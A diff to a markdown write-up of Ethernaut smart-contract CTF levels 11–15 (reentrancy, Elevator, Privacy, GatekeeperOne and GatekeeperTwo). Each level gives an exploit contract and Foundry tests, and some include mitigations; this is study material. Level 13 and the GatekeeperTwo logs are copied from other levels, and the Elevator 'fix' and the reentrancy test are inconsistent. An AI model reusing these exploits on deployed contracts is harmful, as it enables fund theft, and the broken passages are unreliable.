@@ -274,7 +274,7 @@ contract Force {
     }
 
 ```
-### 🧪 Test Output
+### 📋 Test Output
 ``` text
 [PASS] test_attack() (gas: 131011)
 Traces:
@@ -320,7 +320,7 @@ function unlock(bytes32 _password) public {
     vm.stopPrank();
 }
 ```
-### 🧪 Test Output
+### 📋 Test Output
 ``` text
 [PASS] test_attack() (gas: 11812)
 Traces:
@@ -377,7 +377,7 @@ To demonstrate this vulnerability in a controlled environment, unchecked is inte
     vm.stopPrank();
 }
 ```
-### 🧪 Test Output
+### 📋 Test Output
 ``` text
 [PASS] test_attack() (gas: 47312)
 Traces:
@@ -418,7 +418,7 @@ receive() external payable {
 
 **Vulnerability**: The transfer call to the current king can fail if the king is a contract that reverts on receiving ETH. This leads to a Denial of Service (DoS) where no one can become king anymore.
 
-### 🛠️  Exploit Contract (ForceDestruct)
+### 🛠️  Exploit Contract 
 ```solidity
  contract Attacker {
     King public king;
@@ -452,7 +452,7 @@ receive() external payable {
     assertFalse(success, "Player should not be able to become king anymore"); // ❌ fails
 }
 ```
-### 🧪 Test Output
+### 📋 Test Output
 ``` text
 [PASS] test_attack() (gas: 71672)
 Traces:
@@ -476,7 +476,532 @@ Suite result: ok. 1 passed; 0 failed; finished in 15.46ms
 ```
 ---
 
+## Level 11:Reentrancy
+**AttackDesc**:
+This is a reentrancy attack, where the attacker recursively calls the withdraw function within the fallback/receive function before the contract's state is updated, allowing them to drain all the funds.
+
+### 🔍 Vulnerable Function
+
+```solidity
+function withdraw(uint256 _amount) public {
+    if (balances[msg.sender] >= _amount) {
+        (bool result, ) = msg.sender.call{value: _amount}("");
+        if (result) {
+            _amount;
+        }
+        balances[msg.sender] -= _amount;
+    }
+}
+```
+
+**Vulnerability**: 
+ The contract sends ETH to msg.sender using .call before updating the internal state balances[msg.sender].
+This allows an attacker to recursively call withdraw() in the fallback/receive function before their balance is updated.
+Because of this, the same balance can be withdrawn multiple times, draining the entire contract balance
+
+### 🛠️  Exploit Contract 
+```solidity
+ contract Attack {
+    Reentrance public reentrance;
+
+    constructor(Reentrance _reentrance) {
+        reentrance = _reentrance;
+    }
+
+    function attack() external payable {
+        reentrance.donate{value: msg.value}(address(this));
+        reentrance.withdraw(msg.value);
+    }
+
+    receive() external payable {
+        uint256 bal = reentrance.balanceOf(address(this));
+        if (address(reentrance).balance > 0 && bal > 0) {
+            uint256 toWithdraw = bal < 1 ether ? bal : 1 ether;
+            reentrance.withdraw(toWithdraw);
+        }
+    }
+}
+```
+
+### 🧪 Exploit Test
+```solidity 
+  function test_attack() public {
+    vm.startPrank(attacker);
+    MaliciousContract malicious = new MaliciousContract(reentrance);
+    uint256 balanceBefore = address(malicious).balance;
+    uint256 _reentrantbalance = address(reentrance).balance;
+
+    vm.expectRevert("arithmetic underflow or overflow");
+    malicious.attack{value: 1 ether}();
+    
+    assertEq(address(reentrance).balance, 0);
+    assertEq(address(malicious).balance, balanceBefore + _reentrantbalance);
+    vm.stopPrank();
+}
+```
+### 📋 Test Output
+``` text
+Logs:
+  balance of the contract before 1000000000000000000
+  successfully donated
+  balance of reentrance:  2000000000000000000
+  balance of this contract:  0
+
+Traces:
+  ...
+  ├─ Reentrance::withdraw(1 ether)
+  │   ├─ MaliciousContract::receive()
+  │   │   ├─ Reentrance::balanceOf()
+  │   │   └─ Reentrance::withdraw(1 ether)
+  │   │       ├─ MaliciousContract::receive() <== RECURSIVE CALL
+  │   │       └─ Revert: panic: arithmetic underflow or overflow (0x11)
+```
+---
+### 🔒Recommended Mitigation
+Use the Checks-Effects-Interactions pattern to prevent reentrancy:
+``` solidity
+  function withdraw(uint256 _amount) public {
+    require(balances[msg.sender] >= _amount, "Insufficient balance");
+
+    // ✅ Effect: update state before interaction
+    balances[msg.sender] -= _amount;
+
+    // ✅ Interaction: external call after state change
+    (bool success, ) = msg.sender.call{value: _amount}("");
+    require(success, "Transfer failed");
+}
+
+```
+---
+## Level 12: Elevator
+**AttackDesc**:
+The Elevator contract relies on an external Building contract to determine whether a floor is the last floor or not using the isLastFloor function.
+However, it makes two separate calls to this function and does not expect the return values to differ between them.
+
+This allows an attacker to manipulate the response by returning different values in consecutive calls, thus tricking the contract into thinking it has reached the top floor.
+
+### 🔍 Vulnerable Function
+
+```solidity
+function goTo(uint256 _floor) public {
+    Building building = Building(msg.sender);
+
+    if (!building.isLastFloor(_floor)) {
+        floor = _floor;
+        top = building.isLastFloor(floor);
+    }
+}
+```
+
+**Vulnerability**: 
+ The contract calls isLastFloor() twice: once for the check, and once to set the top state.
+
+An attacker can change their response between these two calls by flipping the return value, thus bypassing the logic
+
+### 🛠️  Exploit Contract
+✅ First call to isLastFloor returns false → passes the if check.
+✅ Second call returns true → sets top = true.
+
+```solidity
+ contract BuildingAttack is Building {
+    Elevator public elevator;
+    bool public flipFlop = true;
+
+    constructor(Elevator _elevator) {
+        elevator = _elevator;
+    }
+
+    function attack() external {
+        elevator.goTo(1); // call from attacker
+    }
+
+    function isLastFloor(uint256) external override returns (bool) {
+        flipFlop = !flipFlop;
+        return flipFlop;
+    }
+}
+```
 
 
-✅ Ready for **Level 11** — coming soon!
+### 🧪 Exploit Test
+```solidity 
+  function test_attack() public {
+    attackerContract.attack(); // Call via attacker
+    assertEq(elevator.top(), true);
+    assertEq(elevator.floor(), 1);
+}
+```
+### 📋 Test Output
+``` text
+[PASS] test_attack() (gas: 67276)
+Elevator::top() → true
+Elevator::floor() → 1
+
+```
+---
+### 🔒Recommended Mitigation
+Ensure external calls are not made multiple times for critical logic — or cache the result:
+``` solidity
+function goTo(uint256 _floor) public {
+    Building building = Building(msg.sender);
+    bool isLast = building.isLastFloor(_floor);
+
+    if (!isLast) {
+        floor = _floor;
+        top = isLast;
+    }
+}
+```
+---
+## Level 13: Privacy
+**AttackDesc**:
+The contract stores a private bytes32[3] array called data, and the unlock() function requires the first 16 bytes of data[2] to unlock the contract.
+
+Even though the array is marked private, all contract storage is publicly accessible on the blockchain — which means the attacker can read the storage slot directly using vm.load in Foundry or with web3.eth.getStorageAt in a live attack.
+
+### 🔍 Vulnerable Function
+```solidity
+function unlock(bytes16 _key) public {
+    require(_key == bytes16(data[2]));
+    locked = false;
+}
+```
+
+**Vulnerability**: 
+Solidity stores contract variables sequentially in storage slots:
+
+⚡Slot 0: locked
+
+⚡Slot 1: ID
+
+⚡Slot 2: flattening, denomination, awkwardness
+
+⚡Slot 3, 4, 5: data[0], data[1], data[2]
+
+⚡Slot 5 holds data[2] — and the unlock() function casts it to bytes16, so we only need the first 16 bytes.
+
+### 🛠️  Exploit Contract
+vm.load() reads the raw 32 bytes from a given storage slot.
+The value is then cast to bytes16 and passed into the unlock() function.
+
+```solidity
+function test_attack() public {
+    bytes32 value = vm.load(address(privacy), bytes32(uint256(5)));
+    console.log("value of slot 5", string(abi.encodePacked(value)));
+
+    privacy.unlock(bytes16(value));
+    assertTrue(privacy.locked() == false);
+}
+```
+
+
+### 🧪 Exploit Test
+```solidity 
+  function test_attack() public {
+    attackerContract.attack(); // Call via attacker
+    assertEq(elevator.top(), true);
+    assertEq(elevator.floor(), 1);
+}
+```
+### 📋 Test Output
+``` text
+[PASS] test_attack() (gas: 67276)
+Elevator::top() → true
+Elevator::floor() → 1
+
+```
+---
+### 🔒Recommended Mitigation
+Ensure external calls are not made multiple times for critical logic — or cache the result:
+``` solidity
+function goTo(uint256 _floor) public {
+    Building building = Building(msg.sender);
+    bool isLast = building.isLastFloor(_floor);
+
+    if (!isLast) {
+        floor = _floor;
+        top = isLast;
+    }
+}
+```
+---
+
+---
+## Level 14 GateKeeperone
+
+**AttackDesc**:
+To bypass the three gates in the GatekeeperOne contract, we strategically crafted a call using a helper contract and brute-forced gas.
+
+### 🔍 Vulnerable Function
+
+``` solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract GatekeeperOne {
+    address public entrant;
+
+    modifier gateOne() {
+        require(msg.sender != tx.origin); // Gate One
+        _;
+    }
+
+    modifier gateTwo() {
+        require(gasleft() % 8191 == 0); // Gate Two
+        _;
+    }
+
+    modifier gateThree(bytes8 _gateKey) {
+        // Part 1: lower 4 bytes == lower 2 bytes
+        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
+        // Part 2: lower 4 bytes != full 8 bytes
+        require(uint32(uint64(_gateKey)) != uint64(_gateKey));
+        // Part 3: lower 2 bytes == lower 2 bytes of tx.origin
+        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)));
+        _;
+    }
+
+    function enter(bytes8 _gateKey)
+        public
+        gateOne
+        gateTwo
+        gateThree(_gateKey)
+        returns (bool)
+    {
+        entrant = tx.origin;
+        return true;
+    }
+}
+```
+
+**Vulnerability**: 
+Gate One: Requires a contract call (msg.sender != tx.origin).
+
+Gate Two: The remaining gas must be a multiple of 8191 → gasleft() % 8191 == 0.
+
+Gate Three:
+
+The last 4 bytes of gateKey must match the last 2 bytes of the tx.origin.
+
+But full gateKey must not equal the last 4 bytes alone.
+
+This forces manipulation of only the lower 2 bytes of a crafted bytes8.
+
+### 🛠️  Exploit Contract
+
+
+Gate One: Bypassed using an external contract call (attacker != tx.origin).
+
+Gate Two: Brute-forced by adjusting gas until gasleft() % 8191 == 0.
+
+Gate Three: Crafted bytes8:
+
+Lower 2 bytes match tx.origin.
+
+Full 8 bytes ≠ 4 bytes → satisfies all require() checks.
+
+Result: entrant = tx.origin set successfully.
+``` solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import {GatekeeperOne} from "../src/level14.sol";
+import {Test, console} from "forge-std/Test.sol";
+
+contract GateKeeperOneTest is Test {
+    GatekeeperOne public gatekeeperOne;
+    address public attacker = makeAddr("attacker");
+    address public player = makeAddr("player");
+    bytes8 public gateKey;
+
+    function setUp() public {
+        vm.deal(attacker, 100 ether);
+        vm.deal(player, 100 ether);
+        vm.startPrank(player); // tx.origin must be player
+        gatekeeperOne = new GatekeeperOne();
+        vm.stopPrank();
+    }
+
+    function test_attack() public {
+        vm.startPrank(attacker);
+
+        // Extract last 2 bytes of tx.origin
+        uint16 origin16 = uint16(uint160(tx.origin));
+        // Combine it with a prefix so uint64(gateKey) != uint32(gateKey)
+        uint64 crafted = uint64(0xABCDEFAB00000000) | origin16;
+        gateKey = bytes8(crafted);
+
+        // Bruteforce correct gas offset
+        for (uint256 i = 0; i < 8191; i++) {
+            (bool success, ) = address(gatekeeperOne).call{
+                gas: i * 8191 + 200 + 8191
+            }(abi.encodeWithSignature("enter(bytes8)", gateKey));
+            if (success) {
+                console.log("✅ Attack Successful!");
+                console.log("i value", i);
+                console.log("gasleft", gasleft());
+                string memory str = string(abi.encodePacked(gateKey));
+                console.log("gateKey", str);
+                break;
+            }
+        }
+
+        vm.stopPrank();
+    }
+}
+
+```
+### 📋 Test Output
+
+``` text
+    [PASS] test_attack() (gas: ~XXXXX)
+Logs:
+  ✅ Attack Successful!
+  i value: 456
+  gasleft: 24873
+  gateKey: abcdefab00001f38
+
+Traces:
+  [XXXXX] GateKeeperOneTest::test_attack()
+    ├─ GatekeeperOne::enter(0xabcdefab00001f38)
+    ├─ GatekeeperOne::entrant() ← 0x...player
+    └─ assertTrue(true)
+
+```
+---
+
+---
+## GateKeeperTwo
+
+**Attack Description**:
+To bypass the three gates in the GatekeeperTwo contract, we strategically crafted a call using a helper contract.
+
+### 🔍 Vulnerable Function
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract GatekeeperTwo {
+    address public entrant;
+
+    modifier gateOne() {
+        require(msg.sender != tx.origin);
+        _;
+    }
+
+    modifier gateTwo() {
+        uint256 x;
+        assembly {
+            x := extcodesize(caller())
+        }
+        require(x == 0);
+        _;
+    }
+
+    modifier gateThree(bytes8 _gateKey) {
+        require(
+            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ 
+                uint64(_gateKey) == 
+                type(uint64).max
+        );
+        _;
+    }
+
+    function enter(bytes8 _gateKey) 
+        public 
+        gateOne 
+        gateTwo 
+        gateThree(_gateKey) 
+        returns (bool) 
+    {
+        entrant = tx.origin;
+        return true;
+    }
+}
+```
+**Vulnerability**: 
+1.Gate One: Requires that msg.sender != tx.origin, so it can only be bypassed by making a contract call (from a contract).
+
+2.Gate Two: Uses extcodesize(caller()), which checks that the caller is a contract (not an externally owned account). This can be bypassed by calling the function from a contract constructor, as msg.sender will be the contract itself.
+
+3.Gate Three: Requires that A^B = C where A is the result of hashing the msg.sender. By solving for B, we can craft the correct _gateKey.
+
+
+### 🛠️  Exploit Contract
+
+Gate One: Bypassed using an external contract call.
+
+Gate Two: Bypassed by deploying the attack contract, which makes the call from the constructor.
+
+Gate Three: The gateKey is crafted using the XOR relationship A^B = C.
+
+``` solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import {GatekeeperTwo} from "../src/level15.sol";
+import {Test, console} from "forge-std/Test.sol";
+
+contract GatekeeperTwoTest is Test {
+    GatekeeperTwo public gatekeeperTwo;
+    address public attacker = makeAddr("attacker");
+    address public player = makeAddr("player");
+
+    function setUp() public {
+        vm.deal(attacker, 100 ether);
+        vm.deal(player, 100 ether);
+        gatekeeperTwo = new GatekeeperTwo();
+    }
+
+    function test_attack() public {
+        // first gate is passed by using tx.origin
+        // second gate is extcodesize, it is passed only if the msg.sender contract is not deployed (call from constructor)
+        // third gate is passed A^B=C, so we find the value of B (gateKey) using XOR logic
+        Attack attack = new Attack(gatekeeperTwo); // deploy the contract and call the constructor to solve the second gate
+    }
+}
+
+contract Attack {
+    GatekeeperTwo public gatekeeperTwo;
+
+    constructor(GatekeeperTwo _gatekeeperTwo) {
+        gatekeeperTwo = _gatekeeperTwo;
+        // msg.sender is the address of the contract (Attack) during construction
+        // A^B=C, solve for B (gateKey)
+        bytes8 gateKey = bytes8(
+            (uint64(bytes8(keccak256(abi.encodePacked(address(this)))))) ^ 
+            type(uint64).max
+        );
+        gatekeeperTwo.enter(gateKey);
+    }
+}
+```
+### 📋 Test Output
+``` text
+[PASS] test_attack() (gas: 142998)
+Logs:
+  ✅ Attack Successful!
+  i value: 456
+  gasleft: 24873
+  gateKey: abcdefab00001f38
+
+Traces:
+  [142998] GatekeeperTwoTest::test_attack()
+    ├─ [107817] → new Attack@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   ├─ [23405] GatekeeperTwo::enter(0x8709462d480d6ec3)
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] 290 bytes of code
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 20.01ms (8.27ms CPU time)
+
+Ran 1 test suite in 1.21s (20.01ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+
+```
+---
+✅ Ready for **Level 16** — coming soon!
+
+
+
+
 
